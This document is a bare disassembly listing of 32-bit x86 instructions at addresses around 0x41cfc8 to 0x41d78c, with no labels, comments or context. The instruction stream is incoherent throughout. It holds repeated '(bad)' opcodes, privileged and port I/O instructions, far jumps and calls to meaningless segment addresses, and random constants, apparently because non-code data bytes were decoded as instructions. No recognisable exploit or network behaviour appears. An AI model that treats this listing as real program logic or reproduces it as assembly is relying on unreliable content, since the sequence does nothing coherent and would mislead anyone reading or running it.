  41cfc8:	mov    bl,0x19
  41cfca:	mov    cl,0x1f
  41cfcc:	push   ebp
  41cfcd:	inc    ebx
  41cfce:	jmp    0x2d61:0xd816999f
  41cfd5:	ret    
  41cfd6:	jno    0x41cfa5
  41cfd8:	clc    
  41cfd9:	lahf   
  41cfda:	cmc    
  41cfdb:	mov    ecx,edx
  41cfdd:	(bad)  
  41cfde:	(bad)  
  41cfdf:	sub    BYTE PTR [edx],bl
  41cfe1:	fild   WORD PTR [eax+ebx*8]
  41cfe4:	dec    edx
  41cfe5:	fsubr  DWORD PTR [eax-0x7cbc1f93]
  41cfeb:	or     eax,0x9e15f3fa
  41cff0:	pop    esi
  41cff1:	cmc    
  41cff2:	mov    ch,0x52
  41cff4:	leave  
  41cff5:	int    0x23
  41cff7:	push   0xba229a33
  41cffc:	out    dx,al
  41cffd:	mov    ecx,0x348fbbb6
  41d002:	xlat   BYTE PTR ds:[ebx]
  41d003:	mov    ebp,0x3cef9b45
  41d008:	fcmovb st,st(7)
  41d00a:	push   ss
  41d00b:	cs out dx,eax
  41d00d:	inc    esi
  41d00e:	mul    BYTE PTR [edx]
  41d010:	cli    
  41d011:	call   0x8bd7:0x2f9687ac
  41d018:	adc    al,0xe3
  41d01a:	sub    eax,0xbc98d4ea
  41d01f:	popf   
  41d020:	push   0x3e80e12c
  41d025:	test   DWORD PTR [edi-0xfa83fb2],esp
  41d02b:	adc    esi,DWORD PTR [eax+0x1cee055b]
  41d031:	bnd jmp 0xfd93b69c
  41d037:	jno    0x41d000
  41d039:	ja     0x41cfc3
  41d03b:	into   
  41d03c:	add    dh,BYTE PTR [ebx+0x54]
  41d03f:	and    eax,0x187debc0
  41d044:	(bad)  
  41d045:	in     al,dx
  41d046:	inc    esi
  41d047:	repz jbe 0x41d03b
  41d04a:	and    BYTE PTR [ecx+0x8],al
  41d04d:	icebp  
  41d04e:	push   cs
  41d04f:	add    eax,0x52995a61
  41d054:	adc    al,0x28
  41d056:	imul   esp,DWORD PTR [ecx+0x77],0x9bd44fb6
  41d05d:	inc    ebx
  41d05e:	jl     0x41cfed
  41d060:	mov    eax,ds:0x5aab84a9
  41d065:	xchg   esp,eax
  41d066:	test   DWORD PTR [eax+0x70],ecx
  41d069:	push   cs
  41d06a:	stos   DWORD PTR es:[edi],eax
  41d06b:	sbb    eax,0xf5f1126
  41d070:	popf   
  41d071:	add    eax,0xa5ff419e
  41d076:	jb     0x41d07e
  41d078:	outs   dx,BYTE PTR ds:[esi]
  41d079:	rcl    BYTE PTR [edi-0x67],cl
  41d07c:	das    
  41d07d:	sbb    eax,0xd40cafbd
  41d082:	cmp    dh,BYTE PTR [ecx+0x22]
  41d085:	icebp  
  41d086:	jge    0x41d0db
  41d088:	xchg   edi,eax
  41d089:	xlat   BYTE PTR ds:[ebx]
  41d08a:	cmp    DWORD PTR [edx-0xb],0xfffffffe
  41d08e:	cld    
  41d08f:	pop    edx
  41d090:	aad    0x6a
  41d092:	loope  0x41d10b
  41d094:	jb     0x41d112
  41d096:	pusha  
  41d097:	aam    0xf3
  41d099:	pop    edi
  41d09a:	inc    ebp
  41d09b:	fld    QWORD PTR [edx-0x15]
  41d09e:	fidivr DWORD PTR [esi-0x65]
  41d0a1:	arpl   WORD PTR [di],ax
  41d0a4:	or     bl,bh
  41d0a6:	cmp    bh,BYTE PTR ds:0xa51c2677
  41d0ac:	ss push ebx
  41d0ae:	fidivr DWORD PTR [ebx+edx*4]
  41d0b1:	aas    
  41d0b2:	cmp    ah,BYTE PTR [edx]
  41d0b4:	ja     0x41d127
  41d0b6:	mov    ds:0x4f3294a4,al
  41d0bb:	shl    BYTE PTR [edi-0xf705be4],cl
  41d0c1:	icebp  
  41d0c2:	dec    ebx
  41d0c3:	lea    ebx,[esi+0x3b357315]
  41d0c9:	aam    0xc
  41d0cb:	xor    bh,BYTE PTR [edi+ecx*1+0x44]
  41d0cf:	not    DWORD PTR [edx-0x12e8dbc2]
  41d0d5:	inc    esp
  41d0d6:	jmp    0xd5232e81
  41d0db:	fdivr  DWORD PTR [edi+0x34c81305]
  41d0e1:	in     al,dx
  41d0e2:	sub    BYTE PTR [esi+0x40],0x88
  41d0e6:	and    al,0x5a
  41d0e8:	mov    edi,0xf88d1459
  41d0ed:	ret    0x8dbc
  41d0f0:	cwde   
  41d0f1:	adc    DWORD PTR [eax+0x1e],eax
  41d0f4:	xchg   esi,eax
  41d0f5:	inc    ebp
  41d0f6:	enter  0x2122,0x7e
  41d0fa:	add    ah,al
  41d0fc:	cli    
  41d0fd:	nop
  41d0fe:	jbe    0x41d0c5
  41d100:	jne    0x41d155
  41d102:	fld    DWORD PTR [esi]
  41d104:	jo     0x41d105
  41d106:	fwait
  41d107:	mov    ebx,0x63f5a623
  41d10c:	daa    
  41d10d:	(bad)  
  41d10e:	shl    ebx,1
  41d110:	inc    edx
  41d111:	int    0x3f
  41d113:	xchg   edi,eax
  41d114:	in     eax,dx
  41d115:	push   esp
  41d116:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d117:	pop    edx
  41d118:	outs   dx,DWORD PTR ds:[esi]
  41d119:	repz int3 
  41d11b:	and    edi,DWORD PTR [eax]
  41d11d:	(bad)  
  41d11e:	out    dx,al
  41d11f:	xchg   ecx,eax
  41d120:	mov    BYTE PTR [edi+0x9fde0a],ah
  41d126:	jl     0x41d16e
  41d128:	fcmovb st,st(6)
  41d12a:	mov    ch,0xce
  41d12c:	and    ah,bl
  41d12e:	lds    ecx,FWORD PTR [eax]
  41d130:	mov    WORD PTR [ebp+0x24],cs
  41d133:	aam    0xe8
  41d135:	(bad)  [edx]
  41d137:	pusha  
  41d138:	out    0xe3,al
  41d13a:	or     esp,DWORD PTR gs:[ebx+0x73]
  41d13e:	push   0xaf51dc07
  41d143:	jmp    0x1151f39b
  41d148:	and    dl,bl
  41d14a:	mov    ch,0x45
  41d14c:	enter  0x961d,0x90
  41d150:	neg    BYTE PTR [edi+0x57477f33]
  41d156:	inc    esi
  41d157:	fcomp  DWORD PTR [ecx-0x7b]
  41d15a:	and    ch,cl
  41d15c:	out    dx,eax
  41d15d:	addr16 push eax
  41d15f:	in     al,0xdb
  41d161:	int3   
  41d162:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d163:	fcomp  DWORD PTR [ebp-0x12]
  41d166:	fist   WORD PTR [ebp+0x31]
  41d169:	(bad)  
  41d16a:	je     0x41d127
  41d16c:	int3   
  41d16d:	mov    bl,0x2c
  41d16f:	cmp    BYTE PTR [ebp+0x78a2f7c3],cl
  41d175:	fcompp 
  41d177:	jmp    0xf3a3:0x7bf71e07
  41d17e:	pop    ss
  41d17f:	jge    0x41d1c4
  41d181:	pop    edx
  41d182:	sbb    al,0x8d
  41d184:	ja     0x41d1bf
  41d186:	(bad)  
  41d187:	jmp    FWORD PTR [ebx+ebp*2]
  41d18a:	push   ecx
  41d18b:	retf   
  41d18c:	sbb    dh,BYTE PTR [eax-0xe5266f1]
  41d192:	leave  
  41d193:	out    0xda,al
  41d195:	fs sub esp,edx
  41d198:	sub    BYTE PTR [esi+0x46],ah
  41d19b:	adc    BYTE PTR [edx+0x4363d91e],ch
  41d1a1:	adc    DWORD PTR [edx+0x46ffb381],edx
  41d1a7:	mov    al,ds:0xdc9b6cec
  41d1ac:	cmp    al,0xfd
  41d1ae:	push   ss
  41d1af:	aad    0xe9
  41d1b1:	pop    ebx
  41d1b2:	mov    bl,0xc4
  41d1b4:	jg     0x41d1a8
  41d1b6:	lock rcr BYTE PTR [ecx-0xfe42e36],0xfe
  41d1be:	pusha  
  41d1bf:	ins    BYTE PTR es:[edi],dx
  41d1c0:	addr16 (bad) 
  41d1c2:	fs dec ebx
  41d1c4:	call   0x3bb3:0x794e590f
  41d1cb:	stos   DWORD PTR es:[edi],eax
  41d1cc:	jmp    0xd533:0xbd9a3318
  41d1d3:	mov    ebx,0xb4575ab9
  41d1d8:	test   al,0xc6
  41d1da:	mov    bl,0xa8
  41d1dc:	pop    edx
  41d1dd:	cmp    ebp,edx
  41d1df:	jbe    0x41d25c
  41d1e1:	dec    ebp
  41d1e2:	mov    ebp,0x4f5fd650
  41d1e7:	dec    esi
  41d1e8:	jmp    0x41d244
  41d1ea:	and    DWORD PTR [edi+0x4d],eax
  41d1ed:	pop    ss
  41d1ee:	and    edi,DWORD PTR [eax]
  41d1f0:	adc    DWORD PTR [eax-0x3d],ecx
  41d1f3:	xchg   DWORD PTR [eax+0x63],edx
  41d1f6:	mov    al,ds:0xbbcd2a86
  41d1fb:	fnstenv [ebx]
  41d1fd:	mov    ?,esi
  41d1ff:	lahf   
  41d200:	rol    BYTE PTR [edx-0x279a9e90],0xbb
  41d207:	femms  
  41d209:	jno    0x41d248
  41d20b:	pop    eax
  41d20c:	sub    edx,ecx
  41d20e:	mov    bh,0x15
  41d210:	icebp  
  41d211:	mov    ebx,0xf83befb2
  41d216:	mov    cl,0xa7
  41d218:	mov    eax,ds:0xaeac7522
  41d21d:	test   DWORD PTR [esi-0x510ca6e],esp
  41d223:	retf   
  41d224:	push   ecx
  41d225:	call   0xf29f17cb
  41d22a:	daa    
  41d22b:	adc    DWORD PTR [esi+0x5e],0x425e2348
  41d232:	test   DWORD PTR [ebp+0x59],ebx
  41d235:	pushf  
  41d236:	pop    edi
  41d237:	jle    0x41d1e7
  41d239:	push   ebp
  41d23a:	jns    0x41d1c3
  41d23c:	add    BYTE PTR [ebx-0x29],ch
  41d23f:	jp     0x41d299
  41d241:	pop    esi
  41d242:	hlt    
  41d243:	cmp    al,0x28
  41d245:	rep ins DWORD PTR es:[edi],dx
  41d247:	imul   edi,DWORD PTR [eax],0x1b0cf768
  41d24d:	and    BYTE PTR [ebx-0x674fd2d5],ah
  41d253:	sahf   
  41d254:	or     BYTE PTR [edi-0x1af7d4c],bl
  41d25a:	in     al,0x68
  41d25c:	nop
  41d25d:	test   esp,esi
  41d25f:	push   0xc2df6682
  41d264:	ror    BYTE PTR [ecx+0x6cdfe657],1
  41d26a:	jno    0x41d26e
  41d26c:	dec    ecx
  41d26d:	inc    esi
  41d26e:	rol    DWORD PTR [eax-0x76],0x2
  41d272:	cmc    
  41d273:	add    BYTE PTR cs:[edx+0x31],ch
  41d277:	pop    ecx
  41d278:	leave  
  41d279:	adc    ch,BYTE PTR [ebx+0x4efc7de8]
  41d27f:	mov    BYTE PTR [ebx],al
  41d281:	pop    eax
  41d282:	(bad)  
  41d284:	or     WORD PTR [edx+eax*4-0x1f],0xffa1
  41d28a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d28b:	fidivr DWORD PTR [ebx+0x74683567]
  41d291:	shl    DWORD PTR [eax-0x13d5b3e7],1
  41d297:	dec    edx
  41d298:	aas    
  41d299:	call   0xb2f0c8ef
  41d29e:	cmp    edx,esp
  41d2a0:	rcl    DWORD PTR [edi],1
  41d2a2:	inc    edx
  41d2a3:	sub    ah,ch
  41d2a5:	rol    eax,0x0
  41d2a8:	stos   BYTE PTR es:[edi],al
  41d2a9:	mov    WORD PTR [edx-0x16],es
  41d2ac:	inc    ebp
  41d2ad:	mov    ch,dl
  41d2af:	mov    edi,0x5909fe65
  41d2b4:	push   ds
  41d2b5:	inc    edx
  41d2b6:	mov    ch,0xcc
  41d2b8:	xchg   esp,eax
  41d2b9:	mov    edi,0x48dbf09a
  41d2be:	pop    es
  41d2bf:	retf   
  41d2c0:	mov    esp,0x261f07e9
  41d2c5:	imul   esp,DWORD PTR [edi-0x28bf714],0x2171886f
  41d2cf:	push   ds
  41d2d0:	pop    es
  41d2d1:	sub    ebx,DWORD PTR [eax+0x3f]
  41d2d4:	cld    
  41d2d5:	outs   dx,DWORD PTR ds:[esi]
  41d2d6:	mov    dl,0x38
  41d2d8:	jns    0x41d2be
  41d2da:	cmp    eax,0xa427dce9
  41d2df:	daa    
  41d2e0:	loopne 0x41d2dc
  41d2e2:	aas    
  41d2e3:	mov    eax,0x6cca043b
  41d2e8:	jle    0x41d2bf
  41d2ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d2eb:	mov    cl,0x10
  41d2ed:	shl    DWORD PTR [eax],cl
  41d2ef:	mov    ds:0x57102d23,al
  41d2f4:	and    DWORD PTR [eax],ebp
  41d2f6:	xchg   edx,ebp
  41d2f8:	enter  0x8ac1,0x24
  41d2fc:	int    0x3
  41d2fe:	mov    edi,DWORD PTR [edi+0x12]
  41d301:	call   0x1e95:0xa290a00d
  41d308:	xchg   esi,eax
  41d309:	push   ds
  41d30a:	(bad)  
  41d30b:	call   0xa74fe1c9
  41d310:	gs dec eax
  41d312:	push   es
  41d313:	or     BYTE PTR [edx],ah
  41d315:	xor    dh,BYTE PTR [ebx]
  41d317:	xchg   edx,eax
  41d318:	out    0xfc,al
  41d31a:	mov    dh,0x0
  41d31c:	loopne 0x41d375
  41d31e:	cmp    al,0x84
  41d320:	and    eax,0xd7961289
  41d325:	xchg   edi,eax
  41d326:	int3   
  41d327:	mov    dh,0x44
  41d329:	xchg   ebx,eax
  41d32a:	dec    esp
  41d32b:	and    al,0x58
  41d32d:	aas    
  41d32e:	sub    al,0xd8
  41d330:	inc    esi
  41d331:	cmp    al,0xda
  41d333:	rcr    BYTE PTR [esp+eiz*2+0x2b8ac46b],0x16
  41d33b:	mov    ebp,0x1c70fc1e
  41d340:	and    ah,BYTE PTR ss:[ebx-0xfa8d09f]
  41d347:	mov    cl,0xe6
  41d349:	fdiv   QWORD PTR [esi+edi*8]
  41d34c:	xor    eax,0x71b279fc
  41d351:	mov    ds:0xc448330f,al
  41d356:	ins    BYTE PTR es:[edi],dx
  41d357:	mov    esp,0x9fdd5e46
  41d35c:	inc    ecx
  41d35d:	mov    ecx,0x9f38bf1
  41d362:	out    0xf1,eax
  41d364:	jo     0x41d385
  41d366:	push   ebp
  41d367:	xor    eax,0x7fb6486a
  41d36c:	and    al,0x19
  41d36e:	repz mov eax,ds:0xc727f77d
  41d374:	or     dh,ah
  41d376:	mov    al,0x82
  41d378:	leave  
  41d379:	sub    ebp,DWORD PTR [edi+0x24]
  41d37c:	mov    ch,0x75
  41d37e:	into   
  41d37f:	fwait
  41d380:	ret    
  41d381:	lahf   
  41d382:	ins    DWORD PTR es:[edi],dx
  41d383:	mov    ah,0x4d
  41d385:	aas    
  41d386:	ja     0x41d3e9
  41d388:	xchg   BYTE PTR [edx+0x35f508d7],cl
  41d38e:	xchg   esi,eax
  41d38f:	xor    dl,BYTE PTR [ebx-0x1]
  41d392:	fstp   DWORD PTR [esi]
  41d394:	fidivr DWORD PTR [edx+0x7fca91a2]
  41d39a:	mov    bh,al
  41d39c:	nop
  41d39d:	or     esi,ebp
  41d39f:	sahf   
  41d3a0:	mov    dh,0x17
  41d3a2:	add    al,0x50
  41d3a4:	and    eax,0x6350d630
  41d3a9:	call   0x86090e97
  41d3ae:	(bad)  
  41d3af:	in     al,dx
  41d3b0:	stos   DWORD PTR es:[edi],eax
  41d3b1:	jnp    0x41d404
  41d3b3:	xor    BYTE PTR [ebx-0x79],dl
  41d3b6:	sbb    eax,0x2f166e3d
  41d3bb:	jb     0x41d43b
  41d3bd:	out    0x62,eax
  41d3bf:	mov    ah,0x42
  41d3c1:	sub    DWORD PTR [ebp+0x6b],esp
  41d3c4:	call   0xbe5a:0x3623d4bf
  41d3cb:	lods   al,BYTE PTR ds:[esi]
  41d3cc:	push   ds
  41d3cd:	mov    bl,BYTE PTR ds:0x78adc84f
  41d3d3:	inc    ebp
  41d3d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3d5:	repz jmp 0x41d3ba
  41d3d8:	add    dl,BYTE PTR [ebx-0x7]
  41d3db:	push   ds
  41d3dc:	mov    edi,0x8960c622
  41d3e1:	jg     0x41d432
  41d3e3:	xlat   BYTE PTR ds:[ebx]
  41d3e4:	aad    0x54
  41d3e6:	cld    
  41d3e7:	mov    eax,ds:0x7dfa2dbf
  41d3ec:	lock shl BYTE PTR [edx+0x22a935c8],1
  41d3f3:	inc    edi
  41d3f4:	and    DWORD PTR [edi+edi*2-0x17e257fc],edx
  41d3fb:	jb     0x41d397
  41d3fd:	adc    al,bl
  41d3ff:	jo     0x41d417
  41d401:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d402:	ss (bad) 
  41d404:	js     0x41d3b1
  41d406:	adc    edi,DWORD PTR [ebx]
  41d408:	test   eax,0xf5a093d2
  41d40d:	jnp    0x41d3ac
  41d40f:	push   ds
  41d410:	push   ss
  41d411:	mov    dl,0x62
  41d413:	pop    ss
  41d414:	fldcw  WORD PTR [esi+0x13]
  41d417:	cdq    
  41d418:	icebp  
  41d419:	adc    edi,ecx
  41d41b:	sar    DWORD PTR [ecx-0x49c97655],0xe3
  41d422:	scas   al,BYTE PTR es:[edi]
  41d423:	int    0xf2
  41d425:	(bad)  
  41d426:	loopne 0x41d3fb
  41d428:	sbb    dl,ch
  41d42a:	div    ch
  41d42c:	and    esi,DWORD PTR [eax+ebx*1-0x60]
  41d430:	iret   
  41d431:	fisub  WORD PTR [ebx+0x7c]
  41d434:	sti    
  41d435:	inc    DWORD PTR [ecx+0x5c74d3d4]
  41d43b:	or     eax,0xc6c59ba3
  41d440:	lock pop eax
  41d442:	test   DWORD PTR [ecx],ebx
  41d444:	mov    eax,?
  41d446:	mov    eax,ds:0xdbe1e17e
  41d44b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d44c:	add    ebp,ebp
  41d44e:	outs   dx,BYTE PTR ss:[esi]
  41d450:	fisubr WORD PTR [edi+esi*2]
  41d453:	xor    DWORD PTR [ebx-0x4c39e4c],edx
  41d459:	aad    0xee
  41d45b:	stos   BYTE PTR es:[edi],al
  41d45c:	int3   
  41d45d:	hlt    
  41d45e:	hlt    
  41d45f:	xchg   esi,eax
  41d460:	addr16 mov ds:0xf745,eax
  41d464:	sub    al,0x2b
  41d466:	mov    dh,0xe9
  41d468:	jb     0x41d458
  41d46a:	fstp   DWORD PTR gs:[ebx-0x1a]
  41d46e:	or     eax,0xc14b8448
  41d473:	inc    ecx
  41d474:	(bad)  
  41d476:	inc    ebp
  41d477:	mov    dl,0xf0
  41d479:	aam    0x17
  41d47b:	xor    eax,0xbad45d19
  41d480:	mov    ds:0x96a4c4aa,eax
  41d485:	xor    BYTE PTR [edx-0x5b],0x1d
  41d489:	ss mov al,0xf5
  41d48c:	pop    esp
  41d48d:	adc    al,0x2b
  41d48f:	jg     0x41d4c5
  41d491:	mov    ds:0x1ddade85,al
  41d496:	btr    DWORD PTR [ebp-0x123ab966],ecx
  41d49d:	or     al,0x65
  41d49f:	or     eax,edx
  41d4a1:	xor    BYTE PTR [ebp+0xa68e54d],al
  41d4a7:	iret   
  41d4a8:	fcomp  DWORD PTR [edx+eiz*4-0x7e]
  41d4ac:	popa   
  41d4ad:	push   edi
  41d4ae:	rcr    DWORD PTR [edx],1
  41d4b0:	mov    es,WORD PTR [ecx+eax*1]
  41d4b3:	ror    DWORD PTR [esi+0x5c60f53e],0xc4
  41d4ba:	fs push cs
  41d4bc:	test   DWORD PTR ds:[ebx+0x5b],edx
  41d4c0:	outs   dx,DWORD PTR ds:[esi]
  41d4c1:	or     DWORD PTR [eax-0x49894f87],ecx
  41d4c7:	ror    DWORD PTR [edx],0xab
  41d4ca:	ja     0x41d4cf
  41d4cc:	jmp    0x41d477
  41d4ce:	rcr    bl,cl
  41d4d0:	jp     0x41d52d
  41d4d2:	ror    BYTE PTR [esi-0x20b6719],1
  41d4d8:	std    
  41d4d9:	or     BYTE PTR [ebp-0x13b1610f],bl
  41d4df:	or     DWORD PTR [esi-0x7d417c48],esi
  41d4e5:	das    
  41d4e6:	xor    ch,dl
  41d4e8:	cmp    al,0xf7
  41d4ea:	arpl   WORD PTR [esi-0x68],bx
  41d4ed:	pop    ecx
  41d4ee:	sbb    al,0x4c
  41d4f0:	loopne 0x41d49a
  41d4f2:	pop    ebp
  41d4f3:	pusha  
  41d4f4:	mov    edx,0x1004ea90
  41d4f9:	imul   edx,DWORD PTR [ecx+0x70],0xa2a1bd39
  41d500:	pop    esi
  41d501:	and    dl,ch
  41d503:	pushf  
  41d504:	sbb    al,dh
  41d506:	xchg   ebp,eax
  41d507:	mov    bl,0x71
  41d509:	in     al,0xc2
  41d50b:	ret    
  41d50c:	int    0x1d
  41d50e:	add    cl,al
  41d510:	dec    ebp
  41d511:	jle    0x41d4b3
  41d513:	jo     0x41d58b
  41d515:	mov    bh,0xcf
  41d517:	in     al,0x6a
  41d519:	adc    BYTE PTR [esi+0x1d],bh
  41d51c:	add    edx,ecx
  41d51e:	xor    ebp,DWORD PTR [edi+0x6f]
  41d521:	push   ecx
  41d522:	add    BYTE PTR [ebx+edi*8],al
  41d525:	ds sub al,0x5f
  41d528:	mov    ds,WORD PTR [ebx-0x47ca4ad4]
  41d52e:	repnz lock dec edx
  41d531:	(bad)  
  41d532:	cmp    esp,ebx
  41d534:	int3   
  41d535:	ins    DWORD PTR es:[edi],dx
  41d536:	lock xor BYTE PTR [ecx+0x33],ah
  41d53a:	repz mov ss:0x6b1f5426,al
  41d541:	imul   edi,DWORD PTR [ebx-0x27],0x102d79bb
  41d548:	in     al,0x31
  41d54a:	sub    eax,DWORD PTR [ebx+0x76]
  41d54d:	loope  0x41d4d6
  41d54f:	popf   
  41d550:	aad    0xfe
  41d552:	es cwde 
  41d554:	lock in al,0xe0
  41d557:	push   esi
  41d558:	sahf   
  41d559:	jmp    0x4079a606
  41d55e:	xor    ebp,DWORD PTR [ebx+0x54]
  41d561:	adc    edi,esi
  41d563:	sub    ebp,DWORD PTR [ecx+0x1]
  41d566:	jg     0x41d5c0
  41d568:	add    DWORD PTR [edi],esi
  41d56a:	add    edi,edi
  41d56c:	push   esi
  41d56d:	add    eax,0x8cb0b296
  41d572:	add    BYTE PTR [edx+0x1c],dh
  41d575:	retf   
  41d576:	push   es
  41d577:	sahf   
  41d578:	pop    edi
  41d579:	xor    cl,ch
  41d57b:	sahf   
  41d57c:	into   
  41d57d:	test   BYTE PTR [ebx-0x2b],ch
  41d580:	inc    esi
  41d581:	cld    
  41d582:	cmp    dl,dh
  41d584:	int    0xc1
  41d586:	dec    esp
  41d587:	jb     0x41d5e3
  41d589:	sbb    BYTE PTR fs:[ecx+0x7778e6dc],bl
  41d590:	aad    0xdd
  41d592:	cmp    eax,0xd81b3b8c
  41d597:	and    eax,DWORD PTR [ebx+0x12]
  41d59a:	sti    
  41d59b:	jnp    0x41d5e8
  41d59d:	cmp    al,0x2d
  41d59f:	dec    ebx
  41d5a0:	sbb    dh,bl
  41d5a2:	pop    ecx
  41d5a3:	cwde   
  41d5a4:	or     DWORD PTR [ebx-0x1752aa38],0x3b011c79
  41d5ae:	imul   ebp,DWORD PTR [edx+0x71f7fe8d],0xfc785d05
  41d5b8:	push   cs
  41d5b9:	mov    al,ds:0x5b6b8d37
  41d5be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5bf:	jo     0x41d635
  41d5c1:	stc    
  41d5c2:	mul    BYTE PTR [esi-0x2577fac3]
  41d5c8:	add    BYTE PTR [ebx-0xabb67da],bh
  41d5ce:	ins    BYTE PTR es:[edi],dx
  41d5cf:	mov    bl,0x67
  41d5d1:	lods   al,BYTE PTR ds:[esi]
  41d5d2:	lods   al,BYTE PTR gs:[esi]
  41d5d4:	pop    ebp
  41d5d5:	mov    dl,0x8c
  41d5d7:	add    BYTE PTR [ebx+ebp*4-0x6f],al
  41d5db:	fnsave [edx-0x77]
  41d5de:	pop    ecx
  41d5df:	fnsave [esi+0x1d]
  41d5e2:	(bad)  
  41d5e3:	aam    0xaa
  41d5e5:	add    DWORD PTR [edx-0x3b],0x904098d0
  41d5ec:	mov    ds:0xfeda0bdd,al
  41d5f1:	into   
  41d5f2:	fistp  DWORD PTR [ecx]
  41d5f4:	lock sub DWORD PTR [ebp+0x72],0x42d28794
  41d5fc:	cmp    eax,0x554c70d5
  41d601:	loopne 0x41d5ed
  41d603:	push   es
  41d604:	mov    edi,0xffb5e290
  41d609:	bnd jns 0x41d5b5
  41d60c:	xor    al,0x42
  41d60e:	xlat   BYTE PTR ds:[ebx]
  41d60f:	hlt    
  41d610:	vpaddusw ymm7,ymm6,YMMWORD PTR [edi-0x7262ce8e]
  41d618:	clc    
  41d619:	es mov eax,0x2e71705c
  41d61f:	fidivr DWORD PTR [ecx-0x4b7d5b1c]
  41d625:	fnstcw WORD PTR [ebp-0x3eaa3601]
  41d62b:	or     BYTE PTR [edx+0x4a58bd98],0x34
  41d632:	addr16 daa 
  41d634:	lods   al,BYTE PTR ds:[esi]
  41d635:	fldcw  WORD PTR [eax+edi*2]
  41d638:	pop    ebx
  41d639:	dec    ebp
  41d63a:	loope  0x41d628
  41d63c:	push   0x447bdf69
  41d641:	sahf   
  41d642:	add    BYTE PTR [edi-0x10],bl
  41d645:	inc    ebx
  41d646:	call   0x7cd4681b
  41d64b:	or     esi,DWORD PTR [esi]
  41d64d:	out    dx,al
  41d64e:	std    
  41d64f:	into   
  41d650:	dec    DWORD PTR [ebx]
  41d652:	and    BYTE PTR [esi-0x47],ah
  41d655:	jecxz  0x41d63d
  41d657:	inc    edi
  41d658:	lea    ebx,[ebp+ecx*1+0x3e]
  41d65c:	pop    eax
  41d65d:	mov    dl,BYTE PTR [ebx*4-0x6f6a58b]
  41d664:	mov    esp,0x7e65fb54
  41d669:	mov    ecx,0x754f2bb2
  41d66e:	nop
  41d66f:	dec    ecx
  41d670:	test   eax,0x851670c4
  41d675:	add    al,0xf4
  41d677:	pop    es
  41d678:	xor    DWORD PTR [edx-0x55],eax
  41d67b:	(bad)  
  41d67c:	icebp  
  41d67d:	fld    QWORD PTR [ebx]
  41d67f:	fwait
  41d680:	cmp    eax,0x18d7c307
  41d685:	lds    edx,FWORD PTR [ecx-0x3a]
  41d688:	gs mov esi,0xc889c6b4
  41d68e:	dec    esp
  41d68f:	scas   eax,DWORD PTR es:[edi]
  41d690:	sahf   
  41d691:	ret    0xb764
  41d694:	js     0x41d6f3
  41d696:	test   eax,0x41ead6fc
  41d69b:	in     al,0x36
  41d69d:	sbb    BYTE PTR [ebp+ebp*8-0x63],bh
  41d6a1:	pop    ecx
  41d6a2:	lahf   
  41d6a3:	mov    eax,ds:0x46d2fb5
  41d6a8:	pop    ss
  41d6a9:	dec    ecx
  41d6aa:	jo     0x41d686
  41d6ac:	test   eax,0x9b29d7f3
  41d6b1:	add    eax,0xed3b8262
  41d6b6:	mov    ds:0xa136424,al
  41d6bb:	mov    ds:0xc465ccf0,eax
  41d6c0:	sbb    eax,0xf4bd5787
  41d6c5:	sub    ch,bl
  41d6c7:	jbe    0x41d6f7
  41d6c9:	mov    bl,0x36
  41d6cb:	push   ds
  41d6cc:	sbb    al,0x7f
  41d6ce:	jmp    0xd2e3:0x6d172f2c
  41d6d5:	dec    BYTE PTR [edx+eax*2+0x18c3ee3d]
  41d6dc:	mov    ebp,0x9b576ea8
  41d6e1:	sbb    al,0xdd
  41d6e3:	xchg   edi,eax
  41d6e4:	inc    eax
  41d6e5:	jmp    0x800b9b0b
  41d6ea:	repnz dec esi
  41d6ec:	sar    BYTE PTR [ecx-0x46],1
  41d6ef:	jmp    0x41d693
  41d6f1:	je     0x41d74d
  41d6f3:	jno    0x41d6fc
  41d6f5:	ins    DWORD PTR es:[edi],dx
  41d6f6:	int3   
  41d6f7:	or     DWORD PTR [ecx],eax
  41d6f9:	push   0x22
  41d6fb:	pop    esp
  41d6fc:	int    0x94
  41d6fe:	push   edi
  41d6ff:	push   ds
  41d700:	popa   
  41d701:	mov    al,BYTE PTR [esi-0x20c4b2aa]
  41d707:	and    eax,0xddcb62df
  41d70c:	(bad)  
  41d70d:	hlt    
  41d70e:	sbb    ch,BYTE PTR [ebx]
  41d710:	shr    DWORD PTR [ebp+0x1247bef],cl
  41d716:	mov    edi,0xb2e38e0b
  41d71b:	mov    al,0xa1
  41d71d:	inc    edi
  41d71e:	adc    eax,0x36a28e49
  41d723:	push   ss
  41d724:	sub    edx,DWORD PTR ds:0x89a03ea8
  41d72a:	aaa    
  41d72b:	(bad)  [esi]
  41d72d:	popa   
  41d72e:	fwait
  41d72f:	cdq    
  41d730:	push   eax
  41d731:	sub    eax,eax
  41d733:	scas   al,BYTE PTR es:[edi]
  41d734:	or     al,0xb4
  41d736:	push   0x3b3137ff
  41d73b:	outs   dx,BYTE PTR ds:[esi]
  41d73c:	fstp   QWORD PTR [ecx-0x2281e71e]
  41d742:	xchg   edx,eax
  41d743:	xor    al,0x53
  41d745:	shl    DWORD PTR [ebx+0x7be70fed],1
  41d74b:	or     al,0xab
  41d74d:	dec    ebp
  41d74e:	add    ah,BYTE PTR [ebx]
  41d750:	lahf   
  41d751:	out    0xa9,al
  41d753:	pop    ds
  41d754:	icebp  
  41d755:	mov    cl,0x5a
  41d757:	mov    eax,0x9cc8267c
  41d75c:	dec    esi
  41d75d:	xchg   esi,eax
  41d75e:	jno    0x41d785
  41d760:	jb     0x41d769
  41d762:	psubw  mm3,QWORD PTR [esi-0x17]
  41d766:	cli    
  41d767:	xchg   ecx,eax
  41d768:	ret    
  41d769:	ret    0xedf4
  41d76c:	adc    BYTE PTR [eax],0x46
  41d76f:	push   esp
  41d770:	mov    ebx,esp
  41d772:	cmp    esp,esp
  41d774:	mov    dl,0x67
  41d776:	(bad)  
  41d777:	sti    
  41d778:	add    dl,BYTE PTR [edi+0x14]
  41d77b:	lods   eax,DWORD PTR ds:[esi]
  41d77c:	xor    cl,dh
  41d77e:	js     0x41d79b
  41d780:	popf   
  41d781:	test   eax,0x589a7f22
  41d786:	inc    esp
  41d787:	mov    ecx,0xfc3b89
  41d78c:	iret   
